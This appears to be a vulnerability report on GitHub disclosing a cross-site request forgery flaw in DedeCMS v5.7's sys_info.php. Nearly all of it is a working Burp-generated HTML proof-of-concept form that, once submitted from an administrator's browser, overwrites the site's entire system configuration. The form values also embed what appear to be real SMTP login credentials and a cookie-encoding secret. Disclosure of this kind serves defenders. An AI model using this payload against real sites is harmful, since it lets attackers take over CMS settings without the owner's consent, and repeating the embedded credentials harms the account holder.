target:https://github.com/wdsunwq/DedeCMSv5
version: v5.7

DedeCMS v5.7 was discovered to contain a Cross-Site Request Forgery (CSRF) via the component /src/dede/sys_info.php
![1](https://github.com/Hckwzh/cms/assets/128144400/6658e56f-9f44-4431-a192-8b1b097f9f6f)


Poc:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1/src/dede/sys_info.php" method="POST">
      <input type="hidden" name="token" value="8c93a0a2a8dafd4ea6cceedebb4c51ac" />
      <input type="hidden" name="dopost" value="save" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;basehost" value="http&#58;&#47;&#47;127&#46;0&#46;0&#46;1" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;indexurl" value="&#47;src" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;indexname" value="�&#184;&#187;�&#161;�" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;webname" value="�&#136;&#145;�&#154;&#132;�&#189;&#145;�&#171;&#153;" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;arcdir" value="&#47;a" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;medias&#95;dir" value="&#47;uploads" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;fck&#95;xhtml" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;df&#95;style" value="default" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;powerby" value="Copyright&#32;&amp;copy&#59;&#32;2002&#45;2017&#32;DEDECMS&#46;&#32;�&#187;&#135;�&#162;&#166;�&#167;&#145;�&#138;&#128;&#32;�&#137;&#136;�&#157;&#131;�&#137;&#128;�&#156;&#137;" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;keywords" value="" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;description" value="" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;beian" value="" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;cmspath" value="&#47;src" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;cookie&#95;encode" value="0ge1Ro09WDXTHegbnY6wRHSsY1S3f1aA" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;backup&#95;dir" value="backupdata" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;adminemail" value="admin&#64;dedecms&#46;com" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;html&#95;editor" value="ckeditor" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;domain&#95;cookie" value="" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;specnote" value="6" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;list&#95;symbol" value="&#32;&gt;&#32;" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;keyword&#95;replace" value="Y" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;multi&#95;site" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;dede&#95;log" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;ftp&#95;host" value="" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;ftp&#95;port" value="21" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;ftp&#95;user" value="" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;ftp&#95;pwd" value="" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;ftp&#95;root" value="&#47;" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;ftp&#95;mkdir" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;cli&#95;time" value="8" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;sendmail&#95;bysmtp" value="Y" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;smtp&#95;server" value="smtp&#46;qq&#46;com" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;smtp&#95;port" value="25" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;smtp&#95;usermail" value="desdev&#64;vip&#46;qq&#46;com" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;smtp&#95;user" value="desdev" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;smtp&#95;password" value="7260444huxiao" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;online&#95;type" value="nps" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;upload&#95;switch" value="Y" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;allsearch&#95;limit" value="1" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;rewrite" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;delete" value="Y" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;typedir&#95;df" value="Y" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;remote&#95;site" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;title&#95;site" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;mysql&#95;type" value="mysql" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;ddimg&#95;width" value="240" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;ddimg&#95;height" value="180" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;imgtype" value="jpg&#124;gif&#124;png" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;softtype" value="zip&#124;gz&#124;rar&#124;iso&#124;doc&#124;xsl&#124;ppt&#124;wps" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;mediatype" value="swf&#124;mpg&#124;mp3&#124;rm&#124;rmvb&#124;wmv&#124;wma&#124;wav&#124;mid&#124;mov" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;album&#95;width" value="800" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;album&#95;row" value="3" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;album&#95;col" value="4" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;album&#95;pagesize" value="12" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;album&#95;style" value="2" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;album&#95;ddwidth" value="200" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;max&#95;face" value="50" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;addon&#95;savetype" value="ymd" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;qk&#95;uploadlit" value="Y" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;ddimg&#95;full" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;ddimg&#95;bgcolor" value="0" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;uplitpic&#95;cut" value="Y" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;album&#95;mark" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;mb&#95;open" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;mb&#95;album" value="Y" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;mb&#95;upload" value="Y" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;mb&#95;upload&#95;size" value="1024" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;mb&#95;sendall" value="Y" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;mb&#95;rmdown" value="Y" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;mb&#95;addontype" value="swf&#124;mpg&#124;mp3&#124;rm&#124;rmvb&#124;wmv&#124;wma&#124;wav&#124;mid&#124;mov&#124;zip&#124;rar&#124;doc&#124;xsl&#124;ppt&#124;wps" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;mb&#95;max" value="500" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;mb&#95;notallow" value="www&#44;bbs&#44;ftp&#44;mail&#44;user&#44;users&#44;admin&#44;administrator" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;mb&#95;idmin" value="3" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;mb&#95;pwdmin" value="3" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;mb&#95;pwdtype" value="32" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;md&#95;idurl" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;mb&#95;rank" value="10" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;md&#95;mailtest" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;mb&#95;spacesta" value="&#45;10" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;mb&#95;allowncarc" value="Y" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;mb&#95;allowreg" value="Y" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;mb&#95;adminlock" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;mb&#95;spaceallarc" value="0" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;mb&#95;wnameone" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;mb&#95;feedcheck" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;mb&#95;msgischeck" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;mb&#95;reginfo" value="Y" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;notallowstr" value="�&#157;&#158;�&#133;&#184;&#124;�&#137;&#190;�&#187;&#139;�&#151;&#133;&#124;�&#152;&#179;�&#151;&#191;" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;replacestr" value="�&#165;&#185;�&#166;&#136;&#124;�&#174;&#131;�&#166;&#136;&#124;�&#187;&#150;�&#166;&#136;&#124;�&#189;&#160;�&#166;&#136;&#124;�&#142;&#187;�&#173;&#187;&#124;�&#180;&#177;浜�" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;feedbackcheck" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;feedback&#95;ck" value="Y" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;feedback&#95;time" value="30" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;feedback&#95;numip" value="30" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;vdcode&#95;member" value="Y" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;mb&#95;cktitle" value="Y" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;mb&#95;editday" value="7" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;caicai&#95;sub" value="2" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;caicai&#95;add" value="2" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;feedback&#95;add" value="5" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;feedback&#95;sub" value="5" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;feedback&#95;forbid" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;sendarc&#95;scores" value="10" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;sendfb&#95;scores" value="3" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;face&#95;adds" value="10" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;moreinfo&#95;adds" value="20" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;money&#95;scores" value="50" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;login&#95;adds" value="2" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;userad&#95;adds" value="10" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;feedback&#95;guest" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;arcsptitle" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;arcautosp" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;arcautosp&#95;size" value="5" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;list&#95;son" value="Y" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;keyword&#95;like" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;index&#95;max" value="10000" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;index&#95;cache" value="86400" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;tplcache" value="Y" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;tplcache&#95;dir" value="&#47;data&#47;tplcache" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;makesign&#95;cache" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;search&#95;max" value="50000" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;search&#95;maxrc" value="300" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;search&#95;time" value="3" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;need&#95;typeid2" value="Y" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;cache&#95;type" value="id" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;makeindex" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;make&#95;andcat" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;make&#95;prenext" value="Y" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;puccache&#95;time" value="36000" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;memcache&#95;enable" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;memcache&#95;mc&#95;defa" value="memcache&#58;&#47;&#47;127&#46;0&#46;0&#46;1&#58;11211&#47;default127" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;memcache&#95;mc&#95;oth" value="" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;digg&#95;update" value="0" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;disable&#95;funs" value="phpinfo&#44;eval&#44;exec&#44;passthru&#44;shell&#95;exec&#44;system&#44;proc&#95;open&#44;popen&#44;curl&#95;exec&#44;curl&#95;multi&#95;exec&#44;parse&#95;ini&#95;file&#44;show&#95;source&#44;file&#95;put&#95;contents" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;disable&#95;tags" value="php" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;auot&#95;description" value="240" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;rm&#95;remote" value="Y" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;arc&#95;dellink" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;arc&#95;autopic" value="Y" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;arc&#95;autokeyword" value="Y" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;title&#95;maxlen" value="60" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;check&#95;title" value="Y" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;jump&#95;once" value="Y" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;task&#95;pwd" value="" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;addon&#95;domainbind" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;addon&#95;domain" value="" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;df&#95;dutyadmin" value="admin" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;arc&#95;dirname" value="Y" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;arc&#95;click" value="&#45;1" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;replace&#95;num" value="2" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;sphinx&#95;article" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;sphinx&#95;host" value="localhost" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;sphinx&#95;port" value="9312" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;cross&#95;sectypeid" value="N" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;baidunews&#95;limit" value="100" />
      <input type="hidden" name="edit&#95;&#95;&#95;cfg&#95;updateperi" value="15" />
      <input type="hidden" name="imageField&#46;x" value="48" />
      <input type="hidden" name="imageField&#46;y" value="16" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```
![2](https://github.com/Hckwzh/cms/assets/128144400/e2b3916e-32b9-42c9-8931-64d7adfd8de9)



successed

![2](https://github.com/Hckwzh/cms/assets/128144400/d6ccd596-2379-47b7-9869-0ab81f8f0f1f)
